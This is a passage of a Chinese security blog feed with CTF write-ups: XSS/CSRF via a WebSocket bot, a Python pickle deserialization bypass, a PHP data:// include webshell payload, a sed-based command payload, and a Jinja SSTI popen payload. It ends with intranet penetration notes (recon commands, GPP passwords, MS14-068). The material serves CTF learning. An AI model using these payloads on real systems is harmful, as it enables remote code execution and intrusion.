      <link href="/2022/08/06/%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/"/>
      <url>/2022/08/06/%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h2><p> 题目打开，先注册登录一个账号，看源码发现利用websocket进行数据发送<br> 通过 bugreport看以通外网<br> 于是利用xss+csrf进行密码修改<br> 在vps上创建html文件，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;title&gt;&lt;/title&gt; </span><br><span class="line">&lt;script&gt; </span><br><span class="line">var url =</span><br><span class="line"><span class="string">&quot;ws://127.0.0.1:8888/bot&quot;</span>; </span><br><span class="line">var ws = new WebSocket(url); </span><br><span class="line">ws.onopen= <span class="keyword">function</span> (event) &#123; ws.send(<span class="string">&quot;changepw123&quot;</span>); &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>8888端口是经过尝试判断出来的<br>发送bugreport <a href="http://ip:port/1.html">http://ip:port/1.html</a><br>登录admin 买提示得到源码<br>进行审计<br><img src="https://img-blog.csdnimg.cn/a9994b86b51a4d8e8a6302c62c9812db.png"><br>审计传两个product（）<br><img src="https://img-blog.csdnimg.cn/c74394f5bdea47439bf5f220ab8a83e6.png"><br>得到flag</p><h2 id="carsh"><a href="#carsh" class="headerlink" title="carsh"></a>carsh</h2><p>不会  之后看其他人写的后写的要点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># import sqlite3</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response,request, session</span><br><span class="line"><span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,static_url_path=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">app.secret_key=random.randbytes(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, username,password</span>):</span></span><br><span class="line">        self.username=username</span><br><span class="line">        self.token=<span class="built_in">hash</span>(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_password</span>(<span class="params">username</span>):</span></span><br><span class="line">    <span class="keyword">if</span> username==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> admin.secret</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># conn=sqlite3.connect(&quot;user.db&quot;)</span></span><br><span class="line">        <span class="comment"># cursor=conn.cursor()</span></span><br><span class="line">        <span class="comment"># cursor.execute(f&quot;select password from usertable where username=&#x27;&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line">        <span class="comment"># data=cursor.fetchall()[0]</span></span><br><span class="line">        <span class="comment"># if data:</span></span><br><span class="line">        <span class="comment">#     return data[0] </span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     return None</span></span><br><span class="line">        <span class="keyword">return</span> session.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/balancer&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    pickle_data=base64.b64decode(request.cookies.get(<span class="string">&quot;userdata&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> pickle_data <span class="keyword">or</span> <span class="string">b&quot;secret&quot;</span> <span class="keyword">in</span> pickle_data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You damm hacker!&quot;</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -rf *py*&quot;</span>)</span><br><span class="line">    userdata=pickle.loads(pickle_data)</span><br><span class="line">    <span class="keyword">if</span> userdata.token!=<span class="built_in">hash</span>(get_password(userdata.username)):</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Login First&quot;</span></span><br><span class="line">    <span class="keyword">if</span> userdata.username==<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome admin, here is your next challenge!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;You&#x27;re not admin!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    resp = make_response(<span class="string">&quot;success&quot;</span>) </span><br><span class="line">    session[<span class="string">&quot;password&quot;</span>]=request.values.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">&quot;userdata&quot;</span>, base64.b64encode(pickle.dumps(User(request.values.get(<span class="string">&quot;username&quot;</span>),request.values.get(<span class="string">&quot;password&quot;</span>)),<span class="number">2</span>)), max_age=<span class="number">3600</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;source.txt&#x27;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目代码<br><a href="https://xz.aliyun.com/t/7436#toc-0">pickle反序列化漏洞学习</a><br><a href="https://xz.aliyun.com/t/7012">通过AST来构造Pickle opcode</a><br> pickletools<br> 使用pickletools可以方便的将opcode转化为便于肉眼读取的形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">data=<span class="string">b&quot;\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;q\x01\x85q\x02Rq\x03.&quot;</span></span><br><span class="line">pickletools.dis(data)</span><br><span class="line"></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">&#x27;builtins exec&#x27;</span></span><br><span class="line">   <span class="number">17</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">19</span>: X    BINUNICODE <span class="string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span></span><br><span class="line">   <span class="number">43</span>: q    BINPUT     <span class="number">1</span></span><br><span class="line">   <span class="number">45</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">46</span>: q    BINPUT     <span class="number">2</span></span><br><span class="line">   <span class="number">48</span>: R    REDUCE</span><br><span class="line">   <span class="number">49</span>: q    BINPUT     <span class="number">3</span></span><br><span class="line">   <span class="number">51</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">2</span></span><br></pre></td></tr></table></figure><p>截取源码关键路由代码，在该路由下首先通过cookie接收序列代码<br>利用o来绕过R限制<br>首先进行变量覆盖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aa=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;import admin;admin.sec&quot;+&quot;ret=&#x27;</span>shanghe<span class="string">&#x27;;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">OBJ(GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>),aa)</span><br></pre></td></tr></table></figure><p>利用pker进行opcode构造<br>之后base64后放入cookie中，登录即可<br>（报500是正常的）<br>之后登录 弄出504即可<br><a href="https://mp.weixin.qq.com/s/uh7ZvBIQv9fWXzS5Uc-fXQ">wp</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow单身杯 web</title>
      <link href="/2022/07/22/ctfshow%E5%8D%95%E8%BA%AB%E6%9D%AF%20web/"/>
      <url>/2022/07/22/ctfshow%E5%8D%95%E8%BA%AB%E6%9D%AF%20web/</url>
      
        <content type="html"><![CDATA[<h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strrev(<span class="variable">$file</span>)==<span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注释：strrev（）函数可以反转字符串<br>文件包含   利用data伪协议<br>data伪协议就是把一些体量比较小的数据直接嵌入在页面里，而不使用外部链接。 data:text/plain 是嵌入文本<br>还有一点：本题也是利用?&gt;进行截断<br>于是利用payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> eval($_POST[1]);<span class="meta">?&gt;</span>&gt;?;)]1[TSOP_$(lave php?&lt;,nialp/txet//:atad&amp;1=system(&quot;cat /f*&quot;);</span></span><br></pre></td></tr></table></figure><p>得到flag</p><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$param</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span>=escapeshellcmd(substr(<span class="variable">$cmd</span>,<span class="number">0</span>,<span class="number">3</span>)).<span class="string">&quot; &quot;</span>.escapeshellarg(<span class="variable">$param</span>).<span class="string">&quot; &quot;</span>.<span class="keyword">__FILE__</span>;</span><br><span class="line">    shell_exec(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>函数介绍：<br>escapeshellcmd</p><blockquote><p>(PHP 4, PHP 5, PHP 7, PHP 8)<br>escapeshellcmd — shell 元字符转义<br>说明 escapeshellcmd(string $command): string escapeshellcmd() 对字符串中可能会欺骗<br>shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符<br>之前进行转义。<br>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ’ 和 “<br>仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p></blockquote><p>escapeshellarg<br>保证传入字符串</p><blockquote><p>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7, PHP 8)<br>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数<br>说明 escapeshellarg(string $arg): string escapeshellarg()<br>将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell<br>函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。</p></blockquote><p>利用sed进行解题</p><p><a href="https://www.twle.cn/c/yufei/sed/sed-basic-regular-expressions.html">sed介绍</a><br>sed工作流程</p><blockquote><p>读取行 -&gt; 执行 -&gt; 显示 -&gt; 读取行 -&gt; 执行 -&gt; 显示 -&gt; … -&gt; 读取行 -&gt; 执行 -&gt; 显示</p></blockquote><blockquote><p>sed 从输入流 （文件、管道、标准输入流）中读取 一行 并存储在名叫 pattern buffer 的内部缓冲区中。<br>sed 还在内存上开辟了另一个私有的缓冲区 hold buffer 用于保存处理后的数据以供以后检索。<br>每一个周期执行结束，sed 会清空 pattern buffer 缓冲区的内容，但 hold buffer 缓冲区的内容并不会清空。<br>hold buffer 缓冲区用于存储处理后数据，sed 命令并不会对这里的数据处理。</p></blockquote><p>本着需要什么学什么的初心<br>我们直接看payload来学习</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=sed&amp;param=/esca/d;s/shell_exec/system/g;w <span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p>sed支持正则匹配 /esca/匹配到 escape行 d 将其删除<br>sed语句用；间隔开<br>s字符串替换 shell_exec -&gt; system<br>g为全局替换标志</p><blockquote><p>g 标志通常称为 全局替换标志。<br>使用了全局替换标志的替换又称为 贪婪模式。<br>全局替换标志 g 的语法格式如下<br>[address1[,address2]]s/search/replacement/g</p></blockquote><p>w 写入 –&gt;可以看作cp的功能版</p><h2 id="姻缘测试"><a href="#姻缘测试" class="headerlink" title="姻缘测试"></a>姻缘测试</h2><p>/souce发现hint<br><img src="https://img-blog.csdnimg.cn/34d4d7a15509431a823b7cb4a8b07873.png"><br>这里用了and,发现大括号不能同时出现<br>利用‘’进行分割<br>利用payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/result?boy_name=&#123;&#123;<span class="string">&#x27;&amp;girl_name=&#x27;</span>.<span class="keyword">__class__</span>.__base__.__subclasses__()[<span class="number">82</span>].__init__.__globals__.__import__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4fd1f2cbc5144db4b2426f9eba715985.png"></p><blockquote><p>__class__用于返回对象所属的类<br>__base__以字符串的形式返回一个类所继承的类<br>__mro__返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类<br><strong>subclasses</strong>()获取类的所有子类<br>__int__所有自带带类都包含init方法，并且常用它当跳板调用globals<br>__globals__会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合init使用</p></blockquote><p><a href="https://blog.csdn.net/devil8123665/article/details/114598529">SSTI讲解</a></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>下载压缩包  进行暴力破解<br><img src="https://img-blog.csdnimg.cn/384610aff89042a0aabdfc8d98c12272.png"><br>得到密码61f@X<br>解压得到图片<br>利用winhex查看发现有一串base64编码<br><img src="https://img-blog.csdnimg.cn/a2bd2150d1f545bdb487fb1fc829bb40.png"><br>得到不完全的图片  对其进行补全扫描<br>扫描得到一半flag<br>另一半在利用sb打开得到<br>最后记得看提示中将空格替换为_</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>护网（一）</title>
      <link href="/2022/06/19/%E6%8A%A4%E7%BD%91%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2022/06/19/%E6%8A%A4%E7%BD%91%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><h5 id="1、查看系统账户是否安全"><a href="#1、查看系统账户是否安全" class="headerlink" title="1、查看系统账户是否安全"></a>1、查看系统账户是否安全</h5><p>比如看看服务器是否有弱口令，看看远程端口是否对公网开放，，之后看看服务器是不是有可疑账户，、新增账户</p><h5 id="2、看看是否具有异常端口、进程"><a href="#2、看看是否具有异常端口、进程" class="headerlink" title="2、看看是否具有异常端口、进程"></a>2、看看是否具有异常端口、进程</h5><p>查看端口连接情况，是否有远程连接、可疑连接</p><p>排查可疑进程（可以利用D盾工具进行排查，或者手动打开进程管理器进行排查）</p><h5 id="3、检查启动项、任务计划、服务"><a href="#3、检查启动项、任务计划、服务" class="headerlink" title="3、检查启动项、任务计划、服务"></a>3、检查启动项、任务计划、服务</h5><p>看看是否具有异常启动项，看看计划任务、服务自启动，有没有异常的服务自动启动</p><h5 id="4、之后看看是否具有可疑文件、目录"><a href="#4、之后看看是否具有可疑文件、目录" class="headerlink" title="4、之后看看是否具有可疑文件、目录"></a>4、之后看看是否具有可疑文件、目录</h5><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><h5 id="1、查看账号是否安全"><a href="#1、查看账号是否安全" class="headerlink" title="1、查看账号是否安全"></a>1、查看账号是否安全</h5><p>/etc/passwd  看用户信息</p><p>/etc/shadow看密码</p><h5 id="2、通过-bash-history查看帐号执行过的系统命令"><a href="#2、通过-bash-history查看帐号执行过的系统命令" class="headerlink" title="2、通过.bash_history查看帐号执行过的系统命令"></a>2、通过.bash_history查看帐号执行过的系统命令</h5><h5 id="3、看端口、进程、开机启动项、定时任务（crontab-i）"><a href="#3、看端口、进程、开机启动项、定时任务（crontab-i）" class="headerlink" title="3、看端口、进程、开机启动项、定时任务（crontab -i）"></a>3、看端口、进程、开机启动项、定时任务（crontab -i）</h5><h5 id="4、检查异常文件"><a href="#4、检查异常文件" class="headerlink" title="4、检查异常文件"></a>4、检查异常文件</h5><p>后门常放位置（**/tmp** 、**/etc/rc.**local  有时可以读出来<a href="https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020">apache</a>的路径）</p><p><strong>crontab  log</strong></p><h2 id="sqlmap原理"><a href="#sqlmap原理" class="headerlink" title="sqlmap原理"></a>sqlmap原理</h2><p>​    它的工作原理和手工注入的原理是一样的：检测动态页面中get/post参数、cookie、 http头，并爆出数据，不需要我们再手动写payload，因为它有非常强大的引擎，各种各样的参数、各种各样的位置，它都可以去完成SQL注入漏洞的检测、利用、以及数据的提取</p><h4 id="sqlmap-os-shell原理"><a href="#sqlmap-os-shell原理" class="headerlink" title="sqlmap -os -shell原理"></a>sqlmap -os -shell原理</h4><p>​        原理很简单，就是用into outfile函数将一个可以用来上传的php文件写到网站的目录下，然后利用tmpukjhb.php上传了一个tmpbezal.php的文件，tmpbezal.php这个文件可以用来执行系统命令，并且将结果返回出来</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>​    Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击</p><ul><li>猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息。</li><li>绕过认证，列如绕过验证登录网站后台。</li><li>注入可以借助数据库的存储过程进行提权等操作</li></ul><p>防御</p><p>1、检查变量数据类型和格式</p><p>2、过滤特殊符号</p><p>3、绑定变量，使用预编译语句　</p><h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h5><p>就是将一堆sql语句叠加在一起执行，使用分号结束上一个语句再叠加其他语句一起执行</p><h5 id="报错注入常用函数"><a href="#报错注入常用函数" class="headerlink" title="报错注入常用函数"></a>报错注入常用函数</h5><p>updatexml():是mysql对xml文档数据进行查询和修改的xpath函数<br>extractvalue()：是mysql对xml文档数据进行查询的xpath函数<br>floor():mysql中用来取整的函数<br>exp():此函数返回e(自然对数的底)指数X的幂值</p><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。</p><h2 id="log4j原理"><a href="#log4j原理" class="headerlink" title="log4j原理"></a>log4j原理</h2><p>  通过JNDI注入漏洞，黑客可以恶意构造特殊数据请求包，触发此漏洞，从而成功利用此漏洞可以在目标服务器上执行任意代码</p><p><strong>JNID</strong></p><p> 即 Java 的名称与目录服务接口，应用通过该接口与具体的目录服务进行交互</p><h5 id="攻击特征"><a href="#攻击特征" class="headerlink" title="攻击特征"></a>攻击特征</h5><p>攻击者在攻击过程中可能使用 DNSLog 进行漏洞探测，建议查看是否有相关DNSlog告警（对应科来TSA规则：“信息泄露-通过外部平台回显数据”）；</p><p> 回溯流量或日志中是否存在“jndi:ldap://”、“jndi:rmi”等字符。</p><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">CS中：shell+命令即可</span><br><span class="line">//主机信息</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">//网络信息</span><br><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line">//路由表</span><br><span class="line">arp -a</span><br><span class="line"></span><br><span class="line">//进程，查AV</span><br><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">//端口占用情况</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">//是否域环境</span><br><span class="line">net user /domain</span><br><span class="line"></span><br><span class="line">//是否出网</span><br><span class="line">ping baidu.com -n 2</span><br></pre></td></tr></table></figure></blockquote><p>在横向运输前最好先挂挂代理，使得我们可以使用msf的其他工具</p><h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><p>​        横向移动是指当攻击者在内部网络中获得初始访问权限以后，通过扫描，口令爆破，smb传递等技术扩大敏感数据和高价值资产权限并通过受攻击网络环境中移动的行为</p><h4 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h4><p>​        域控简称DC，是在内网里响应安全身份认证请求的网络服务器，对用户进行身份验证，存储用户账户信息，并执行的域的一种安全策略</p><h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4><p>“域”是一个有安全边界的计算机组合（一个域中的用户无法访问另一个域中的资源）</p><h4 id="普通用户获取域管理权限"><a href="#普通用户获取域管理权限" class="headerlink" title="普通用户获取域管理权限"></a>普通用户获取域管理权限</h4><p><strong>利用GPP漏洞获取域管理权限</strong></p><p>SYSVOL是域内的共享文件夹，用来存放登录脚本、组策略脚本等信息。当域管理员通过组策略修改密码时，在脚本中引入用户密码，就可能导致安全问题</p><p>1）访问SYSVOL共享文件夹，搜索包含“cpassword”的XML文件，获取AES加密的密码。</p><p>2）使用kali自带的gpp-decrypt进行破解，从而获取域账号密码，直接登录域管理员账号获取访问权限。</p><p><strong>获取服务器明文登录密码</strong></p><p>使用kiwi模块需要system权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。提到system有两个方法，一是当前的权限是administrator用户，二是利用其它手段先提权到administrator用户。然后administrator用户可以直接getsystem到system权限</p><p><strong>使用MS14-068漏洞进行提权</strong></p><p>MS14068是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的</p><p><strong>窃取域管理员令牌</strong></p><p><strong>进程迁移</strong></p><h4 id="票据"><a href="#票据" class="headerlink" title="票据"></a>票据</h4><p>域认证三部曲：</p><ol><li>Client 上的用户请求KDC服务，最后AS服务生产TGT，返回给Client</li><li>Client 使用TGT请求KDC上的TGS得到ST（TGS ticket）真正访问的票据</li><li>Client使用ST（TGS Ticket）访问Server</li></ol><p>名词基本概念：</p><p>​    KDC: Key Distribution Center，密钥分发中心，负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由AS和TGS组成。</p><p>​    AD: Account Database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。</p><p>（物理方面 KDC和AD 都是一个机子）</p><p>​    TGT: Ticket Granting Ticket = 